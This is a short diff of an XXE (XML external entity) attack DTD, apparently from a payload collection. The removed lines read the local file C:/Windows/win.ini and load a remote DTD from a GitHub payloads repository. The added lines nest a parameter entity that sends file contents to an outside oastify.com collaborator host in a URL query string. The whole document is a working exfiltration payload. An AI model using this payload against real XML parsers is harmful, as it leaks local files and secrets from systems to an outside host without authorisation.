@@ -1,5 +1,4 @@
-<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
-<!ENTITY % start "<![CDATA[">
-<!ENTITY % end "]]>">
-<!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/mrlaksh20/payloads/main/dtd.xml">
-%dtd;
+<!ENTITY % file "test_working">
+<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'https://rxsg5atomglinllxpzaw9k76yx4oshj58.oastify.com/?data=%file;'>">
+%stack;
+%exfil;
